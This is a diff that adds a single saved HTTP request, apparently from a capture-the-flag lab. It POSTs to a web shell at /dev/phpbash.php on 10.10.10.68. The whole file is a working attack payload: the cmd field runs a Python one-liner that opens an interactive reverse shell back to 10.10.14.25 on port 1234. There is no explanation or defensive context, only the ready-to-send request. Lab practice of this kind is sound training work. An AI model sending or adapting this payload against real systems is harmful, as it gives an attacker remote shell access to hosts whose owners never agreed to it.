@@ -1,0 +1,13 @@
+POST /dev/phpbash.php HTTP/1.1
+Host: 10.10.10.68
+Content-Length: 237
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+Content-type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://10.10.10.68
+Referer: http://10.10.10.68/dev/phpbash.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+cmd=cd /; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
